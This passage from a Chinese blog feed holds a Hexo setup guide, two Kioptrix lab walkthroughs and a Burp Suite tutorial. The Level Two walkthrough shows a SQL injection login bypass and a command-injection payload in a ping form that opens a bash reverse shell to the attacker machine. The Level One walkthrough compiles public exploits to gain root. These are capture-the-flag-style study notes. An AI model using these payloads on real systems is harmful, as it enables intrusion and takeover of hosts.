bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#华为源</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://mirrors.huaweicloud.com/repository/npm/</span><br><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228031413.jpg" alt="Pasted-image-20241228031413"><br>2. 安装Hexo，并验证安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装hexo</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment">#验证安装</span></span><br><span class="line">hexo -version</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228031558.jpg" alt="Pasted-image-20241228031558"></p><h2 id="创建博客站点"><a href="#创建博客站点" class="headerlink" title="创建博客站点"></a>创建博客站点</h2><h3 id="VsCdoe安装"><a href="#VsCdoe安装" class="headerlink" title="VsCdoe安装"></a>VsCdoe安装</h3><ul><li>如果你有本身用的习惯的代码编辑器可以略过这一步，没有话建议使用VsCode这个万金油。只要你能想到的功能他都能通过插件实现。</li></ul><ol><li>官网下载<a class="btn-anzhiyu " href="https://code.visualstudio.com/"   title="VsCode"><span>VsCode</span></a><br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228032408.jpg" alt="Pasted-image-20241228032408"></li><li>不清楚配置的除了安装路径和创建桌面快捷方式外一路默认即可，然后点击完成。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228032423.jpg" alt="Pasted-image-20241228032423"></li><li>不熟悉英文的左边扩展搜索<code>chinese</code>可以看到中文扩展点击<code>install</code>即可，注意右下角的提示，点击<code>changes language and restart</code>重启打开即可<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228032558.jpg" alt="Pasted-image-20241228032558"></li><li>设置字体大小，个人习惯<code>20</code>，后续不合适可以回来更改<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228032926.jpg" alt="Pasted-image-20241228032926"></li></ol><h3 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h3><ol><li>找到个喜欢位置构建博客环境，点击上面的路径输入<code>cmd</code>，执行以下命令</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#根据自己喜欢命名</span></span><br><span class="line">hexo init myblog</span><br><span class="line"><span class="comment">#如果已经建立了存放的文件夹可以将`myblog`省略，则会直接在当前目录构建环境</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228033440.jpg" alt="Pasted-image-20241228033440"><br>2. 用VsCode打开文件夹，选择刚刚构建的博客的文件夹，出现提示选择信任作者。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228033917.jpg" alt="Pasted-image-20241228033917"><br>3. 选择终端，新建终端。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228034339.jpg" alt="Pasted-image-20241228034339"><br>4. 执行以下命令，如果提示防火墙则允许。这部分和你在博客路径打开<code>cmd</code>效果一样的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构建相关环境，构建博客的时候已经构建了。如果没有node_xxx文件夹话必须构建</span></span><br><span class="line">npm install</span><br><span class="line"><span class="comment">#预览博客,当命令只有这一条是s开头时可以简写</span></span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228034908.jpg" alt="Pasted-image-20241228034908"><br>5. 按住<code>Ctrl</code>键点击<code>http://localhost:4000/</code>链接就可以看到博客已经创建成功了<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228035422.jpg" alt="Pasted-image-20241228035422"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 不务正业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix-Level Two 综合靶机实战思路</title>
      <link href="/posts/bc2db28d.html"/>
      <url>/posts/bc2db28d.html</url>
      
        <content type="html"><![CDATA[<h2 id="确定攻击靶机"><a href="#确定攻击靶机" class="headerlink" title="确定攻击靶机"></a>确定攻击靶机</h2><ul><li>老样子先确定攻击靶机，多了个数据库服务<ul><li>攻击机：192.168.38.128</li><li>靶机：192.168.38.131<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222143414.jpg" alt="Pasted-image-20241222143414"></li></ul></li></ul><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web服务80-443"><a href="#web服务80-443" class="headerlink" title="web服务80&#x2F;443"></a>web服务80&#x2F;443</h3><h4 id="页面信息"><a href="#页面信息" class="headerlink" title="页面信息"></a>页面信息</h4><ul><li>为一个登录页面，尝试使用SQL注入<code>1&#39;or&#39;1&#39;=&#39;1</code>就进去了存在<code>Sql</code>注入。不过页面目前没发现什么东西。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222143926.jpg" alt="Pasted-image-20241222143926"></li><li>目录扫描到一个路径访问似乎是一个文档<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222145131.jpg" alt="Pasted-image-20241222145131"></li><li>文档路径，不同语言内容类似，就是语言不一样<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222145225.jpg" alt="Pasted-image-20241222145225"></li><li>获取网站指纹信息<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222151042.jpg" alt="Pasted-image-20241222151042"></li><li>nmap获取服务版本信息获取。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222151555.jpg" alt="Pasted-image-20241222151555"></li></ul><h3 id="数据库服务-3306"><a href="#数据库服务-3306" class="headerlink" title="数据库服务|3306"></a>数据库服务|3306</h3><ul><li>尝试连接提示没有开启连接，几乎无解<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223143150.jpg" alt="Pasted-image-20241223143150"></li></ul><h3 id="远程连接服务-22"><a href="#远程连接服务-22" class="headerlink" title="远程连接服务|22"></a>远程连接服务|22</h3><ul><li>连接测试，提示无密钥交换方式需要后续去添加。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223143630.jpg" alt="Pasted-image-20241223143630"></li></ul><h3 id="IPP-CUPS-631"><a href="#IPP-CUPS-631" class="headerlink" title="IPP(CUPS)|631"></a>IPP(CUPS)|631</h3><ul><li>可以通过web页面打开，不过没有任何东西就知道一个版本号码。属于网络打印服务<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223150030.jpg" alt="Pasted-image-20241223150030"></li></ul><h3 id="整理信息"><a href="#整理信息" class="headerlink" title="整理信息"></a>整理信息</h3><ul><li>操作系统：Red Hat Linux</li><li>内核版本：Linux 2.4.9</li></ul><table><thead><tr><th>端口</th><th>服务</th><th>版本信息</th><th>备注</th></tr></thead><tbody><tr><td>22&#x2F;tcp</td><td>ssh</td><td>OpenSSH 3.9p1 (protocol 1.99)</td><td>交换方式需要添加</td></tr><tr><td>80&#x2F;tcp</td><td>http</td><td>Apache httpd 2.0.52 (CentOS) PHP4.3.9</td><td>存在SQL注入</td></tr><tr><td>111&#x2F;tcp</td><td>rpcbind</td><td>2 (RPC #100000)</td><td></td></tr><tr><td>443&#x2F;tcp</td><td>ssl&#x2F;http</td><td>Apache httpd 2.0.52 (CentOS) PHP4.3.9</td><td>存在SQL注入</td></tr><tr><td>631&#x2F;tcp</td><td>ipp</td><td>CUPS 1.1</td><td>打印服务</td></tr><tr><td>3306&#x2F;tcp</td><td>mysql</td><td>MySQL (unauthorized)</td><td>无法远程连接</td></tr></tbody></table><h2 id="搜索攻击点"><a href="#搜索攻击点" class="headerlink" title="搜索攻击点"></a>搜索攻击点</h2><h3 id="历史漏洞POC"><a href="#历史漏洞POC" class="headerlink" title="历史漏洞POC"></a>历史漏洞POC</h3><h4 id="SSH-3-9p1"><a href="#SSH-3-9p1" class="headerlink" title="SSH |  3.9p1"></a>SSH |  3.9p1</h4><ul><li>有一个命令执行但是缺少相关服务，只有用户枚举服务。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223152459.jpg" alt="Pasted-image-20241223152459"></li></ul><h4 id="Web-80-443"><a href="#Web-80-443" class="headerlink" title="Web| 80,443"></a>Web| 80,443</h4><ul><li>只有一个GET拒绝服务符合<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223154528.jpg" alt="Pasted-image-20241223154528"></li></ul><h4 id="CUPS-631"><a href="#CUPS-631" class="headerlink" title="CUPS|631"></a>CUPS|631</h4><ul><li>除开第一个文件上传的，还有几个拒绝服务和本地提权可以使用<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223155240.jpg" alt="Pasted-image-20241223155240"></li></ul><h3 id="测试攻击"><a href="#测试攻击" class="headerlink" title="测试攻击"></a>测试攻击</h3><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><ul><li>前段有个SQL注入回去看看<del>吃了不细看的亏，没注意到他源代码错误的</del><br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223160108.jpg" alt="Pasted-image-20241223160108"></li><li>根据他表单提交的路径为<code>pingit.php</code>，传参为<code>POST</code>传参，传参点为<code>submit</code>表单按钮(必须)，<code>ip</code><ul><li>为什么必须要<code>submit</code>看HTML的类型为提交按钮，在前段需要按了提交按钮表单的内容才能被提交上去，所有是要必须带上的！！！，<code>enctype</code>为提交类型选择表单提交。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223160108.jpg" alt="Pasted-image-20241223160108"></li></ul></li><li>可以<code>ping</code>那么就可能会存在<code>REC</code>远程代码执行<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223163255.jpg" alt="Pasted-image-20241223163255"></li><li>大概确定了目标机器上没有<code>nc</code>命令，只能通过<code>bash</code>将<code>shell</code>弹到攻击机上面</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#传参，&amp;要经过Url编码变成%26，多个参数之间用的不要进行编码，如果不行就修复表单提交</span></span><br><span class="line">ip=127.0.0.1%26/bin/bash -i &gt;%26 /dev/tcp/192.168.38.128/8888 0&gt;&amp;1&amp;submit=submit</span><br><span class="line"><span class="comment">#监听本地端口</span></span><br><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223185306.jpg" alt="Pasted-image-20241223185306"></p><ul><li><code>bash</code>反弹到攻击机上面，先监听再<code>EXECUTE</code><br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223190413.jpg" alt="Pasted-image-20241223190413"></li></ul><h5 id="正常显示表单方法"><a href="#正常显示表单方法" class="headerlink" title="正常显示表单方法"></a>正常显示表单方法</h5><ul><li>刷新登录后的页面，使用Burp Suite抓取请求包，右键拦截响应包后<code>forward</code><br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223160755.jpg" alt="Pasted-image-20241223160755"></li><li>将响应包的那个多的点删掉后关掉拦截就可以了<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223160957.jpg" alt="Pasted-image-20241223160957"></li></ul><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul><li>可以看到当前的用户为<code>apache</code>用户，需要对当前用户权限进行提升，想了想之前看到的<code>CUPS</code>的提权漏洞可以试试<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223191012.jpg" alt="Pasted-image-20241223191012"></li><li>不支持，缺少相关的环境架构(x86)不符合。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223193344.jpg" alt="Pasted-image-20241223193344"></li></ul><h5 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul><li>查看系统的版本和内核确定有没有相关的漏洞<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223193756.jpg" alt="Pasted-image-20241223193756"></li><li>查找相关版本漏洞<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223194013.jpg" alt="Pasted-image-20241223194013"></li><li>查看版本和内核都符合要求<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223194443.jpg" alt="Pasted-image-20241223194443"></li><li>传到靶机上面<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223195148.jpg" alt="Pasted-image-20241223195148"></li><li>编译执行<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241223195340.jpg" alt="Pasted-image-20241223195340"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuInhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix-Level One 综合靶机实战思路</title>
      <link href="/posts/d78bbe1a.html"/>
      <url>/posts/d78bbe1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="确认攻击靶机"><a href="#确认攻击靶机" class="headerlink" title="确认攻击靶机"></a>确认攻击靶机</h2><ul><li>靶机和攻击机都为nat模式为同一个网段，直接对网段进行扫描<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221181758.jpg" alt="Pasted-image-20241221181758"></li></ul><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul><li>注意到开启了web服务信息搜集一波</li></ul><h3 id="dirp目录扫描"><a href="#dirp目录扫描" class="headerlink" title="dirp目录扫描"></a>dirp目录扫描</h3><p><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221205600.jpg" alt="Pasted-image-20241221205600"></p><h3 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h3><p><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221205739.jpg" alt="Pasted-image-20241221205739"></p><h3 id="whatweb指纹"><a href="#whatweb指纹" class="headerlink" title="whatweb指纹"></a>whatweb指纹</h3><ul><li>新信息<code>Red Hat Linux</code><br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221210035.jpg" alt="Pasted-image-20241221210035"></li></ul><h3 id="Nmap获取版本信息"><a href="#Nmap获取版本信息" class="headerlink" title="Nmap获取版本信息"></a>Nmap获取版本信息</h3><ul><li>确认服务版本，不过没有显示<code>139</code>端口的服务信息<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221182309.jpg" alt="Pasted-image-20241221182309"></li><li>尝试使用<code>smb-enum-shares</code>测试，结果一样<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221223718.jpg" alt="Pasted-image-20241221223718"></li><li>尝试连接去抓包看看，获取文件列表，印象里大部分协议进行通讯时会发送相关的信息。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221223848.jpg" alt="Pasted-image-20241221223848"></li><li>过滤<code>SMB</code>包，右键追踪数据流，确定了版本信息<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221224432.jpg" alt="Pasted-image-20241221224432"></li></ul><h3 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h3><ul><li>尝试匿名登录试试，发现有两个共享列表<ul><li><code>-L</code>列出目标机器所有共享</li><li><code>-N</code>匿名登录</li><li><code>-U</code>指定用户</li><li><code>-c</code>执行命令<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221222532.jpg" alt="Pasted-image-20241221222532"></li></ul></li><li>执行命令，有权限限制<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221222851.jpg" alt="Pasted-image-20241221222851"></li></ul><h3 id="主机详细信息"><a href="#主机详细信息" class="headerlink" title="主机详细信息"></a>主机详细信息</h3><ul><li>操作系统：Red Hat Linux</li><li>内核版本：Linux 2.4.9 - 2.4.18</li></ul><h4 id="开放端口及服务"><a href="#开放端口及服务" class="headerlink" title="开放端口及服务"></a>开放端口及服务</h4><table><thead><tr><th>端口</th><th>服务</th><th>版本</th></tr></thead><tbody><tr><td>22&#x2F;tcp</td><td>ssh</td><td>OpenSSH 2.9p2</td></tr><tr><td>80&#x2F;tcp</td><td>http</td><td>Apache httpd 1.3.20</td></tr><tr><td>443&#x2F;tcp</td><td>https</td><td>Apache&#x2F;1.3.20, mod_ssl&#x2F;2.8.4, OpenSSL&#x2F;0.9.6b</td></tr><tr><td>111&#x2F;tcp</td><td>rpcbind</td><td>rpcbind 2</td></tr><tr><td>139&#x2F;tcp</td><td>netbios-ssn</td><td>2.2.1a</td></tr><tr><td>1024&#x2F;tcp</td><td>status</td><td>status 1</td></tr></tbody></table><h2 id="查找攻击点"><a href="#查找攻击点" class="headerlink" title="查找攻击点"></a>查找攻击点</h2><ul><li>先更新一下数据库<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221182403.jpg" alt="Pasted-image-20241221182403"></li></ul><h3 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h3><h4 id="SSH-2-9p2"><a href="#SSH-2-9p2" class="headerlink" title="SSH| 2.9p2"></a>SSH| 2.9p2</h4><ul><li>有个目录执行的漏洞但是没有<code>SFTP</code>服务，放弃。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221220056.jpg" alt="Pasted-image-20241221220056"></li></ul><h4 id="rpcbind"><a href="#rpcbind" class="headerlink" title="rpcbind"></a>rpcbind</h4><ul><li>这个服务不怎么了解也搜搜看，未找到有用信息<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221220521.jpg" alt="Pasted-image-20241221220521"></li><li>nmap脚本扫描，发现了1024端口上，使用<code>rpcinfo</code>来查询RPC服务结果一样<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221220831.jpg" alt="Pasted-image-20241221220831"></li></ul><h4 id="Apache-1-3-20"><a href="#Apache-1-3-20" class="headerlink" title="Apache|1.3.20"></a>Apache|1.3.20</h4><ul><li>注意到有个刚好符合。系统也对得上<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221183158.jpg" alt="Pasted-image-20241221183158"></li></ul><h4 id="Samba-2-2-1a"><a href="#Samba-2-2-1a" class="headerlink" title="Samba |2.2.1a"></a>Samba |2.2.1a</h4><ul><li>注意到一个刚好符合poc的<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221225703.jpg" alt="Pasted-image-20241221225703"></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="apache版本漏洞复现"><a href="#apache版本漏洞复现" class="headerlink" title="apache版本漏洞复现"></a>apache版本漏洞复现</h3><h4 id="获取-编译-exp"><a href="#获取-编译-exp" class="headerlink" title="获取(编译)exp"></a>获取(编译)exp</h4><ul><li><code>-m</code>复制到当前目录<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221230155.jpg" alt="Pasted-image-20241221230155"></li><li><code>gcc</code>编译程序，报错不用管。看到编译出执行文件。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o apache 47080.c -lssl -lcrypto</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221183942.jpg" alt="Pasted-image-20241221183942"></p><h4 id="利用exp测试l漏洞"><a href="#利用exp测试l漏洞" class="headerlink" title="利用exp测试l漏洞"></a>利用exp测试l漏洞</h4><ul><li>可用的系统太多直接前面网站指纹的版本筛选，包括前段页面的时候注意到的多半也和<code>Redhat</code>有关系。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221184442.jpg" alt="Pasted-image-20241221184442"></li><li>按照帮助给的格式填写，目标盒子，端口，以及攻击次数<code>-c</code><br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221184734.jpg" alt="Pasted-image-20241221184734"></li><li>进入成功，但是执行提权时无法下载文件，需要另外方式传入文件<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221185520.jpg" alt="Pasted-image-20241221185520"></li><li>攻击机下载好文件利用<code>http</code>协议传输进去，为什么呢，因为可以看到他本身就有<code>wget</code>命令，那么就用他本身有的命令下载文件最好。<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221201839.jpg" alt="Pasted-image-20241221201839"></li><li>再次进入靶机的<code>shell</code>下载文件并执行<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221202903.jpg" alt="Pasted-image-20241221202903"></li><li>提权成功<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221203151.jpg" alt="Pasted-image-20241221203151"></li></ul><h3 id="Samba版本漏洞复现"><a href="#Samba版本漏洞复现" class="headerlink" title="Samba版本漏洞复现"></a>Samba版本漏洞复现</h3><ul><li><code>-m</code>复制到当前目录<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221230155.jpg" alt="Pasted-image-20241221230155"></li><li>编译执行<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241221230917.jpg" alt="Pasted-image-20241221230917"></li><li>执行exp，直接就是<code>root</code>用户<br><img src="https://imges.xenon.us.kg/20241223/Pasted-image-20241222005604.jpg" alt="Pasted-image-20241222005604"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuInhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite基本用法</title>
      <link href="/posts/56437b95.html"/>
      <url>/posts/56437b95.html</url>
      
        <content type="html"><![CDATA[<ul><li>简介<ul><li>Burp Suite 是一个广泛使用的网络安全测试工具，由 PortSwigger 开发，主要用于渗透测试和 Web 应用程序的安全评估。它包含一系列工具，可以帮助测试 Web 应用程序的漏洞，例如 SQL 注入、XSS（跨站脚本攻击）、CSRF（跨站请求伪造）等。</li></ul></li><li>应用场景<ul><li>安全审计、渗透测试、安全研究</li></ul></li><li>版本<ul><li>社区版、专业版</li></ul></li></ul><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h3 id="拦截代理（Proxy）"><a href="#拦截代理（Proxy）" class="headerlink" title="拦截代理（Proxy）"></a>拦截代理（Proxy）</h3><ul><li>用于拦截和修改客户端与服务器之间的 HTTP&#x2F;HTTPS 请求和响应。可以实时分析并更改数据包内容。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204205023.jpg" alt="Pasted-image-20241204205023"></li><li>将请求包转到其他模块进行配合<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206005839.jpg" alt="Pasted-image-20241206005839"></li><li>对抓到的包进行筛选<ul><li>可筛选特定的状态码和扩展格式，支持正则表达式的形式对包中包含的内容进行筛选。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206012124.jpg" alt="Pasted-image-20241206012124"></li></ul></li><li>进行高亮显示，即将请求包复制成CURL的请求格式<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206012402.jpg" alt="Pasted-image-20241206012402"></li></ul><h3 id="爬虫（Crawler-或-Spider）"><a href="#爬虫（Crawler-或-Spider）" class="headerlink" title="爬虫（Crawler 或 Spider）"></a>爬虫（Crawler 或 Spider）</h3><ul><li>自动扫描 Web 应用程序，发现隐藏链接和输入点。有助于全面覆盖测试范围。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204205237.jpg" alt="Pasted-image-20241204205237"></li></ul><h3 id="扫描器（Scanner）"><a href="#扫描器（Scanner）" class="headerlink" title="扫描器（Scanner）"></a>扫描器（Scanner）</h3><ul><li>自动扫描目标应用的漏洞。提供详细的风险报告，包括发现的漏洞类型和位置。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204205812.jpg" alt="Pasted-image-20241204205812"></li></ul><h3 id="侵入点测试器（Intruder）"><a href="#侵入点测试器（Intruder）" class="headerlink" title="侵入点测试器（Intruder）"></a>侵入点测试器（Intruder）</h3><ul><li>用于自动化测试，尝试多种输入组合，发现漏洞。常用于暴力破解、参数篡改等测试。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204210131.jpg" alt="Pasted-image-20241204210131"></li></ul><h3 id="Repeater-重放器"><a href="#Repeater-重放器" class="headerlink" title="Repeater(重放器)"></a>Repeater(重放器)</h3><ul><li>对特定的请求进行反复编辑和重新发送，观察响应的变化。适合用于精确调试和漏洞验证。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204210347.jpg" alt="Pasted-image-20241204210347"></li></ul><h3 id="解码器（Decoder）"><a href="#解码器（Decoder）" class="headerlink" title="解码器（Decoder）"></a>解码器（Decoder）</h3><ul><li>用于编码和解码数据（如 Base64、URL 编码等）。帮助分析和测试序列化漏洞。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204210613.jpg" alt="Pasted-image-20241204210613"></li></ul><h3 id="扩展（Extender）"><a href="#扩展（Extender）" class="headerlink" title="扩展（Extender）"></a>扩展（Extender）</h3><ul><li>支持加载自定义插件（通过 Burp Extender API），扩展 Burp Suite 的功能。支持多种编程语言（如 Python、Java 等）。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204210700.jpg" alt="Pasted-image-20241204210700"></li></ul><h3 id="Logger-记录器"><a href="#Logger-记录器" class="headerlink" title="Logger(记录器)"></a>Logger(记录器)</h3><ul><li>自动记录通过 Burp Suite 代理发送的每个 HTTP 请求和接收到的响应。包括客户端和目标服务器之间的完整交互。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204212902.jpg" alt="Pasted-image-20241204212902"></li></ul><h3 id="目标（Target）"><a href="#目标（Target）" class="headerlink" title="目标（Target）"></a>目标（Target）</h3><ul><li>提供目标站点的整体结构视图。帮助用户识别测试范围，记录所有交互和发现。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241204213031.jpg" alt="Pasted-image-20241204213031"></li></ul><h3 id="comparer（对比）"><a href="#comparer（对比）" class="headerlink" title="comparer（对比）"></a>comparer（对比）</h3><ul><li>测试不同的输入值（如修改参数、Cookie）对服务器响应的影响。确定特定输入是否导致漏洞行为（如未授权访问）分析请求变化</li><li>对比不同框架之前的区别，来判断有漏洞的包。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206010904.jpg" alt="Pasted-image-20241206010904"></li></ul><h2 id="设置Burp-Suite代理实现抓包"><a href="#设置Burp-Suite代理实现抓包" class="headerlink" title="设置Burp Suite代理实现抓包"></a>设置Burp Suite代理实现抓包</h2><ul><li>Burp Suite是通过流量经过他的代理端口来实现抓取HTTP包的，属于被动抓包的方式，可以通过设置代理来实现抓取特定的包</li></ul><h3 id="查看Burp-Suite代理端口"><a href="#查看Burp-Suite代理端口" class="headerlink" title="查看Burp Suite代理端口"></a>查看Burp Suite代理端口</h3><p><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206013125.jpg" alt="Pasted-image-20241206013125"></p><h3 id="配置全局代理"><a href="#配置全局代理" class="headerlink" title="配置全局代理"></a>配置全局代理</h3><ul><li>即计算机中的所有包都能被捕获到，可在系统网络中的代理设置，端口设置为8080即可(Burp Suite的代理端口)<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206013241.jpg" alt="Pasted-image-20241206013241"></li></ul><h3 id="浏览器设置代理"><a href="#浏览器设置代理" class="headerlink" title="浏览器设置代理"></a>浏览器设置代理</h3><ul><li>有两种方式一种是设置浏览器自身的代理，另一种是使用插件来时间特定网页使用代理。这里使用插件来设置。<ul><li>先设置代理端口<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206013929.jpg" alt="Pasted-image-20241206013929"></li></ul></li><li>设置情景模式选择刚刚创建的模式，特定域名走Burp Suite代理<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206013623.jpg" alt="Pasted-image-20241206013623"></li><li>如果提示网页不安全，则导入证书<ul><li>导出证书<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206020747.jpg" alt="Pasted-image-20241206020747"></li></ul></li><li>双击导入证书，设置为信任的<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206020843.jpg" alt="Pasted-image-20241206020843"></li></ul><h3 id="外部设备走代理端口"><a href="#外部设备走代理端口" class="headerlink" title="外部设备走代理端口"></a>外部设备走代理端口</h3><ul><li>必须外部设备和本机同一网段，或者说之间能通讯</li></ul><h4 id="首先查看本地IP地址"><a href="#首先查看本地IP地址" class="headerlink" title="首先查看本地IP地址"></a>首先查看本地IP地址</h4><p><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206014646.jpg" alt="Pasted-image-20241206014646"></p><h4 id="外部设备配置"><a href="#外部设备配置" class="headerlink" title="外部设备配置"></a>外部设备配置</h4><ul><li>这里用模拟器替代，需要设置桥接模式才能和本机同一网段<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206014845.jpg" alt="Pasted-image-20241206014845"></li></ul><h4 id="配置端口代理"><a href="#配置端口代理" class="headerlink" title="配置端口代理"></a>配置端口代理</h4><ul><li>在无线网络右上角✏️设置手动，主机名为本机IP，端口为代理端口<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206015059.jpg" alt="Pasted-image-20241206015059"></li></ul><h4 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h4><ul><li>在Burp Suite导出der格式证书，后缀改为cer格式传到设备安装<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206020116.jpg" alt="Pasted-image-20241206020116"></li><li>随便设置个名称安装即可<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206020314.jpg" alt="Pasted-image-20241206020314"></li></ul><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><ul><li>能正常抓取<br><img 